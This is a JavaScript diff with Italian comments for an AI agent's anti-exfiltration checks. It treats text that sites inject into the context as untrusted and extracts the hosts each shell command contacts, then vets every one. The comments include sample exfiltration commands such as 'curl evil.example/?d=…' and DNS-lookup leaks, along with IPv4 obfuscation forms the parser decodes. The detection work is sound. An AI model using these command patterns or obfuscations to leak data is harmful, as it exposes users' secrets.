@@ -447,6 +447,17 @@
   // pezzi scritti da altri con da dove vengono (la riga di un blocco li nomina, #810), `scritto` = le conversazioni
   // ripescate, dove stanno le parole dell'utente fuori dalla finestra (#868.6), `salvate` = le pagine di «Aperti per
   // dopo» lette (#845).
+  // Il testo che i siti scrivono nel contesto di un turno senza passare da un'azione (#2293): titoli e ricerche delle
+  // pagine visitate nei preamboli, i titoli delle schede aperte. Accende testo di sconosciuti, ma non è una fonte del
+  // compito: contarlo nei livelli di autonomia è una scelta dell'owner (domanda aperta su #2293).
+  const DAI_SITI = 'CONTESTO_DAI_SITI';
+  function testoDeiSitiComeAzione(gruppi) {
+    const dalContesto = (Array.isArray(gruppi) ? gruppi : [])
+      .map((g) => ({ testo: (Array.isArray(g && g.testi) ? g.testi : []).filter((t) => typeof t === 'string' && t.trim()).join('\n'), fonte: String((g && g.fonte) || '') }))
+      .filter((g) => g.testo);
+    return dalContesto.length ? { type: DAI_SITI, _executed: true, _output: { dalContesto } } : null;
+  }
+
   function contestoDaAzioni(actions) {
     const pezzi = [];
     const conversazioni = [];
@@ -465,7 +476,12 @@
         if (t.trim()) { nonFidato = true; pezzi.push(t); daFuori(t, testo(x.fonte) || 'da fuori'); }
       }
       const type = String(a.type || '').toUpperCase();
-      if (type === 'ESEGUI_COMANDO') {
+      if (type === DAI_SITI) {
+        for (const x of Array.isArray(out.dalContesto) ? out.dalContesto : []) {
+          const t = testo(x && x.testo);
+          if (t.trim()) { nonFidato = true; daFuori(t, testo(x.fonte) || 'dalle pagine visitate'); }
+        }
+      } else if (type === 'ESEGUI_COMANDO') {
         if (out.blocked) continue;
         const t = `${testo(out.stdout)}\n${testo(out.stderr)}`;
         if (t.trim()) { nonFidato = true; pezzi.push(t); daFuori(t, "dall'output di un comando"); }
@@ -814,6 +830,93 @@
     return out;
   }
 
+  // Gli indirizzi a cui un comando si collega (#2293): quelli con lo schema ovunque, e quelli senza (`curl evil.example/?d=…`,
+  // `nslookup dati.evil.example`, `curl 203.0.113.5/?d=…`) dietro un programma di rete, che elenca cmdClassify; senza
+  // l'elenco si guarda ogni parola. Le shell tolgono `^`, virgolette e backtick (#1072.1).
+  // Un nome che finisce con un'estensione di file non è un sito, salvo che l'estensione sia anche un dominio vero (.zip, .sh).
+  const ESTENSIONI = /^(?:gz|tgz|bz2|xz|zip|tar|7z|rar|json|txt|md|log|csv|xml|html?|js|mjs|ts|py|sh|ps1|bat|exe|msi|dmg|deb|rpm|pdf|png|jpe?g|gif|iso|conf|ini|ya?ml|toml)$/i;
+  // Le opzioni il cui valore è un file del computer, non il sito contattato.
+  const OPZIONI_FILE = /^(?:-o|--output|--output-document|-T|--upload-file|-K|--config|-c|--cookie-jar|-D|--dump-header|--trace|--trace-ascii|--cacert|--cert|--key|--capath|-P|--directory-prefix|-a|--append-output|--log-file|-outfile|-infile)$/i;
+  const MAX_INDIRIZZI_COMANDO = 50;
+  // Il sito che un argomento contatta, letto come lo legge il programma (#2293): l'URL del web normalizza le forme di un
+  // IPv4 (`0313.0.0161.5`, `203.0.29445`, `0xcb007105`) e i domini internazionali. `null` se non è un sito.
+  function sitoDellArgomento(arg, tld) {
+    // Lo schema con quante barre vuole (`http:/sito`), e la forma di git e scp (`sito:percorso`) quando l'URL non regge.
+    let s = String(arg).replace(/^([a-z][a-z0-9+-]+):\/+/i, (m, schema) => (/^file$/i.test(schema) ? m : ''));
+    if (/^file:/i.test(s)) return null;
+    let u = null;
+    let scp = null;
+    try { u = new URL(`http://${s}`); } catch (_) {
+      scp = /^((?:[^\s@/:]+@)?[^\s@/:[\]]+):(.*)$/.exec(s);
+      if (scp) s = `${scp[1]}/${scp[2]}`;
+      try { u = scp ? new URL(`http://${s}`) : null; } catch (_) { u = null; }
+    }
+    if (!u) return null;
+    const host = u.hostname;
+    const nome = s.replace(/^[^@/?#]*@/, '');
+    const conAltro = !!scp || /[/?#]/.test(nome) || !!u.port || nome.includes('@') || s !== nome;
+    if (/^\[.*\]$/.test(host)) return u.href;
+    if (/^\d+\.\d+\.\d+\.\d+$/.test(host)) {
+      // Un numero da solo (`-m 30`, `1.5`) non è un IP: lo è una forma che porta oltre 255 o scritta in ottale o in esadecimale.
+      const parti = nome.replace(/[:/?#].*$/, '').split('.');
+      const scritto = parti.some((p) => /^0x/i.test(p) || /^0\d/.test(p));
+      const valori = parti.map((p) => Number(p));
+      if (parti.length >= 3 || scritto || valori[valori.length - 1] > 255 || (parti.length === 1 && valori[0] >= 16777216)) return u.href;
+      return null;
+    }
+    const etichette = host.replace(/\.$/, '').split('.');
+    if (etichette.length < 2 || !etichette.every((e) => /^[a-z0-9_](?:[a-z0-9_-]*[a-z0-9_])?$/.test(e))) return null;
+    const ultima = etichette[etichette.length - 1];
+    if (!/^(?:[a-z]{2,63}|xn--[a-z0-9-]+)$/.test(ultima)) return null;
+    if (conAltro || !tld || tld(ultima)) return u.href;
+    // Senza percorso né porta, un nome che non finisce con un dominio vero è un file (`archivio.tar.gz`) o un nome finto.
+    return etichette.length >= 3 && !ESTENSIONI.test(ultima) ? u.href : null;
+  }
+  function indirizziDelComando(action) {
+    const a = action && typeof action === 'object' ? action : {};
+    const cmd = [a.comando, a.command, a.cmd].filter((v) => typeof v === 'string').join('\n').replace(/[\^`]/g, '');
+    const out = [];
+    const metti = (u) => { if (out.length < MAX_INDIRIZZI_COMANDO && !out.includes(u)) out.push(u); };
+    // Ogni schema porta a un altro computer (ftp, ws, git, smb…) salvo quello dei file: si giudica come la sua forma web,
+    // con sito, nome utente e percorso, perché le regole degli indirizzi conoscono solo quella (#2293).
+    const conSchema = (u) => {
+      const s = /^([a-z][a-z0-9+.-]*):\/\//i.exec(u);
+      if (!s || s[1].length < 2 || /^file$/i.test(s[1])) return;
+      metti(/^https?$/i.test(s[1]) ? u : `http://${u.slice(s[0].length)}`);
+    };
+    // Fra virgolette un indirizzo tiene anche gli spazi; una virgoletta a metà parola (`h"ttps://`) la shell la toglie.
+    const resto = cmd.replace(/(?<![a-z0-9+.-])(["'])\s*([a-z][a-z0-9+.-]*:\/\/[^"']*?)\s*\1/gi, (_m, _q, u) => { conSchema(u); return ' '; })
+      .replace(/["']/g, '')
+      .replace(/\b[a-z][a-z0-9+.-]*:\/\/[^\s<>()|;]+/gi, (m) => { conSchema(m); return ' '; });
+    const C = global.SN_CMD_CLASSIFY;
+    if (C && C.PROGRAMMI_RETE && !C.PROGRAMMI_RETE.test(resto)) return out;
+    const tld = global.SN_STESSO_SITO && global.SN_STESSO_SITO.dominioDiPrimoLivello;
+    let prima = '';
+    for (const pezzo of resto.split(/[\s<>()|;&,]+/)) {
+      const dopoFile = OPZIONI_FILE.test(prima);
+      prima = pezzo;
+      if (!pezzo || dopoFile || /^-{1,2}[a-z-]+=/i.test(pezzo) && OPZIONI_FILE.test(pezzo.split('=')[0])) continue;
+      const tok = pezzo.replace(/^-{1,2}[a-z-]*=/i, '').replace(/^@/, '');
+      if (!tok || tok.startsWith('-')) continue;
+      // La barra rovescia la toglie la shell di Mac e Linux (`raccolta\.com`); su Windows resta: si provano le due letture.
+      for (const forma of new Set([tok, tok.replace(/\\(.)/g, '$1')])) {
+        const sito = sitoDellArgomento(forma, tld);
+        if (sito) { metti(sito.endsWith('/') && !/\/$/.test(forma) ? sito.slice(0, -1) : sito); break; }
+      }
+    }
+    return out;
+  }
+
+  // Un comando che contatta un altro computer: un indirizzo che contatta, o un programma di rete anche senza un sito
+  // leggibile (`curl $H`). La stessa risposta per chi controlla l'uscita e per chi classifica quello che il comando stampa.
+  function comandoInRete(action) {
+    if (indirizziDelComando(action).length) return true;
+    const a = action && typeof action === 'object' ? action : {};
+    const cmd = [a.comando, a.command, a.cmd].filter((v) => typeof v === 'string').join('\n').replace(/[\^`"']/g, '');
+    const C = global.SN_CMD_CLASSIFY;
+    return !C || !C.PROGRAMMI_RETE || C.PROGRAMMI_RETE.test(cmd);
+  }
+
   // Il resto del verdetto è l'anti-esfiltrazione di #587: un OK in più, non un blocco.
   function valutaAvvisi(tipo, action, { memoria, azioni, daPagina, parole = '', domanda = '' }, niente) {
     if (tipo === 'NAVIGA' || tipo === 'LEGGI_PAGINA') {
@@ -826,11 +929,21 @@
       const v = valutaRicerca(String(action.query ?? action.q ?? action.testo ?? action.text ?? ''), { memoria, azioni });
       if (v.exfil) return { ...niente, exfil: true, reason: v.reason };
     }
+    // Un comando che va in rete porta fuori il suo indirizzo come un NAVIGA (#2293): stesso controllo, uno per indirizzo.
+    if (tipo === 'ESEGUI_COMANDO') {
+      const indirizzi = indirizziDelComando(action).map((url) => {
+        const v = valutaNaviga(url, { memoria, azioni, daPagina, parole, domanda });
+        return { url, exfil: !!v.exfil, reason: v.reason || '' };
+      });
+      const primo = indirizzi.find((x) => x.exfil);
+      return { ...niente, exfil: !!primo, reason: primo ? primo.reason : '', ...(indirizzi.length ? { indirizzi } : {}) };
+    }
     return niente;
   }
 
   global.SN_URL_EXFIL = {
     assess, valutaNaviga, valutaRicerca, contestoDaAzioni, valutaUscita, testoUscente, lettiNelTesto, USCITE, USCITE_PAGINA, verboUscita,
+    DAI_SITI, testoDeiSitiComeAzione, indirizziDelComando, comandoInRete,
     taint, taintLetto, taintTestoLetto, taintScritto, structural, exposedAlnum, corpusTokens, segretiDetti,
     // Le parole che presentano una password o un codice, come testo: una regex /g condivisa porterebbe con sé lastIndex.
     PRESENTA: Object.freeze({ password: PRESENTA_PASSWORD.source, codice: PRESENTA_CODICE.source }),
